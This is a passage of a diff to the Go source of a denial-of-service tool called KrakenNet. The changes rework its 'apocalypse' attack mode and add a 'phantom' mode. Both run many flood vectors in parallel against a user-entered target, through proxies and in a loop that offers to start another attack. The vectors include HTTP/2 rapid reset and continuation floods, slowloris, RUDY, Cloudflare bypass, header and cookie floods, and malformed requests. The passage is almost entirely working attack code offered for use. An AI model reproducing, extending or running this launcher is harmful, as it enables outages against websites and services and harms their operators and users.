+					if err := rapidResetOnce(target); err != nil {
+						atomic.AddInt64(&totalFail, 1)
+					}
+				}
+			}
+		})
+
+	case "apocalypse":
+		sixth := workers / 6
+		if sixth < 1 {
+			sixth = 1
+		}
+		funcs := []func(){
+			func() {
+				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
 				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						rapidResetOnce(target)
-					}
-				}
-			}()
-		}
-
-	case "apocalypse":
-		// All 14 HTTP vectors + rapid-reset + h2-cont + h2-priority + slowloris + rudy + ws-flood
-		httpVectors := []requestFunc{
-			sendTLSRequest, apiFloodRequest, cfBypassRequest, headerFloodRequest,
-			mixPostRequest, rangeRequest, cookieBombRequest,
-			cacheBustRequest, cachePoisonRequest, originSpoofRequest,
-			etagStormRequest, acceptFloodRequest, gzipBombRequest,
-			jwtSprayRequest, graphqlDepthRequest, multipartExhaustRequest,
-			retryAfterAbuseRequest,
-		}
-		perVector := workers / len(httpVectors)
-		if perVector < 1 {
-			perVector = 1
-		}
-		for _, fn := range httpVectors {
-			fn := fn
-			for i := 0; i < perVector; i++ {
-				wg.Add(1)
-				go func() {
-					defer wg.Done()
-					client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
-					for {
-						select {
-						case <-ctx.Done():
-							return
-						default:
-							for j := 0; j < connections; j++ {
-								if fn(client, target) {
-									atomic.AddInt64(&totalSuccess, 1)
-								} else {
-									atomic.AddInt64(&totalFail, 1)
-								}
+						for j := 0; j < connections; j++ {
+							if cfBypassRequest(client, target) {
+								atomic.AddInt64(&totalSuccess, 1)
+							} else {
+								atomic.AddInt64(&totalFail, 1)
 							}
 						}
 					}
-				}()
-			}
-		}
-		// + H2 workers
-		for i := 0; i < 2; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
+				}
+			},
+			func() {
+				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
 				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						rapidResetOnce(target)
+						for j := 0; j < connections; j++ {
+							if apiFloodRequest(client, target) {
+								atomic.AddInt64(&totalSuccess, 1)
+							} else {
+								atomic.AddInt64(&totalFail, 1)
+							}
+						}
 					}
 				}
-			}()
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
+			},
+			func() {
 				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						h2ContOnce(target)
+						if err := rapidResetOnce(target); err != nil {
+							atomic.AddInt64(&totalFail, 1)
+						}
 					}
 				}
-			}()
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
+			},
+			func() {
 				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						h2PriorityFlood(target)
+						if slowlorisOnce(target, ctx.Done()) {
+							atomic.AddInt64(&totalReq, 1)
+						} else {
+							atomic.AddInt64(&totalFail, 1)
+						}
 					}
 				}
-			}()
-		}
-		// + slow
-		for i := 0; i < 2; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
+			},
+			func() {
 				client := newNoTimeoutClient()
 				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						rudyRequest(client, target, ctx.Done())
+						if rudyRequest(client, target, ctx.Done()) {
+							atomic.AddInt64(&totalSuccess, 1)
+						} else {
+							atomic.AddInt64(&totalFail, 1)
+						}
 					}
 				}
-			}()
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
+			},
+			func() {
 				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						slowlorisOnce(target, ctx.Done())
+						if err := h2ContOnce(target); err != nil {
+							atomic.AddInt64(&totalFail, 1)
+						}
 					}
 				}
-			}()
+			},
 		}
-		// + WS
-		for i := 0; i < 2; i++ {
-			wg.Add(1)
-			w := &WsFloodWorker{Target: target}
-			go w.Start(ctx, wg)
+		for _, fn := range funcs {
+			f := fn
+			for i := 0; i < sixth; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					f()
+				}()
+			}
+		}
+
+	case "phantom":
+		perMethod := workers / len(phantomMethods)
+		if perMethod < 1 {
+			perMethod = 1
+		}
+		for _, m := range phantomMethods {
+			method := m
+			for i := 0; i < perMethod; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
+					for {
+						select {
+						case <-ctx.Done():
+							return
+						default:
+							switch method {
+							case "kraken":
+								sendTLSRequest(client, target)
+							case "api-flood":
+								apiFloodRequest(client, target)
+							case "cf-bypass":
+								cfBypassRequest(client, target)
+							case "header-flood":
+								headerFloodRequest(client, target)
+							case "mixpost":
+								mixPostRequest(client, target)
+							case "cache-bust":
+								cacheBustRequest(client, target)
+							case "phantom-get":
+								phantomGetRequest(client, target)
+							case "cookie-bomb":
+								cookieBombRequest(client, target)
+							case "malformed":
+								malformedOnce(target)
+							case "rapid-reset":
+								rapidResetOnce(target)
+							case "h2-cont":
+								h2ContOnce(target)
+							}
+							atomic.AddInt64(&totalReq, 1)
+						}
+					}
+				}()
+			}
 		}
 
 	default:
@@ -2430,13 +2403,8 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 	}
 }
 
-// ─────────────────────────────────────────────
-//  ── MAIN ATTACK LOOP ──
-// ─────────────────────────────────────────────
-
 func runAttack() {
 	reader := bufio.NewReader(os.Stdin)
-
 	userAgents = loadListFromFile("useragent.txt")
 	referers = loadListFromFile("referers.txt")
 	proxies = loadListFromFile("http.txt")
@@ -2445,6 +2413,12 @@ func runAttack() {
 	}
 	if len(referers) == 0 {
 		referers = defaultReferers
+	}
+
+	peakRPS = 0
+	rpsIdx = 0
+	for i := range rpsHistory {
+		rpsHistory[i] = 0
 	}
 
 	fmt.Print(Yellow + "Target (URL or IP): " + Reset)
@@ -2468,7 +2442,7 @@ func runAttack() {
 	fmt.Scanf("%d\n", &connections)
 	fmt.Print(Yellow + "Number of workers: " + Reset)
 	fmt.Scanf("%d\n", &workers)
-	fmt.Print(Yellow + "Port (UDP/game only, 0 = 443): " + Reset)
+	fmt.Print(Yellow + "Port (UDP/Game, 0=443): " + Reset)
 	fmt.Scanf("%d\n", &port)
 	fmt.Print(Yellow + "Duration (seconds): " + Reset)
 	fmt.Scanf("%d\n", &durationSec)
@@ -2486,19 +2460,15 @@ func runAttack() {
 		durationSec = 30
 	}
 
-	// Reset counters
 	atomic.StoreInt64(&totalSuccess, 0)
 	atomic.StoreInt64(&totalFail, 0)
 	atomic.StoreInt64(&totalBytes, 0)
 	atomic.StoreInt64(&totalReq, 0)
-	methodMu.Lock()
-	methodCounters = make(map[string]*int64)
-	methodMu.Unlock()
+	lastReq = 0
 
-	// Mission parameters display
 	fmt.Println()
 	fmt.Println(Cyan + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
-	fmt.Println(Cyan+"║"+Reset+"  "+BCyan+"MISSION PARAMETERS"+Reset+strings.Repeat(" ", 36)+Cyan+"║"+Reset)
+	fmt.Println(Cyan + "║" + Reset + "  " + BCyan + "MISSION PARAMETERS" + Reset + strings.Repeat(" ", 36) + Cyan + "║" + Reset)
 	fmt.Println(Cyan + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
 	mparam("Target", target, BWhite)
 	mparam("Method", mode, BYellow)
@@ -2508,42 +2478,36 @@ func runAttack() {
 	mparam("Duration", strconv.Itoa(durationSec)+" seconds", BWhite)
 	mparam("Proxies", strconv.Itoa(len(proxies))+" loaded", BWhite)
 	mparam("UserAgents", strconv.Itoa(len(userAgents))+" loaded", BWhite)
+	mparam("Goroutines", fmt.Sprintf("%d cores available", runtime.NumCPU()), BWhite)
 	fmt.Println(Cyan + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
 	fmt.Println()
-	fmt.Println(BGreen + "[+] Deploying attack workers..." + Reset)
+	fmt.Println(BGreen + "[+] Deploying PHANTOM workers..." + Reset)
 
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
 	defer cancel()
 	var wg sync.WaitGroup
 
 	attackStart = time.Now()
-	go statsReporter(ctx, mode)
+	go statsReporter(ctx)
 
 	launchWorkers(ctx, &wg, mode, hostName)
 	wg.Wait()
 	printFinalStats(mode)
 }
 
-// ─────────────────────────────────────────────
-//  ── ENTRY POINT ──
-// ─────────────────────────────────────────────
-
 func main() {
 	rand.Seed(time.Now().UnixNano())
+	runtime.GOMAXPROCS(runtime.NumCPU())
 	fmt.Print("\033[2J\033[H")
 	printBanner()
 	reader := bufio.NewReader(os.Stdin)
-
-	// Suppress unused import warning for json — used in hybrid mode for future extension
-	_ = json.Marshal
-
 	for {
 		runAttack()
 		fmt.Print(Yellow + "\nStart another attack? (y/n): " + Reset)
 		again, _ := reader.ReadString('\n')
 		again = strings.TrimSpace(strings.ToLower(again))
 		if again != "y" {
-			fmt.Println(BGreen + "[+] KrakenNet stopped. Goodbye." + Reset)
+			fmt.Println(BGreen + "[+] KrakenNet PHANTOM offline. Ghost exits." + Reset)
 			break
 		}
 		fmt.Print("\033[2J\033[H")
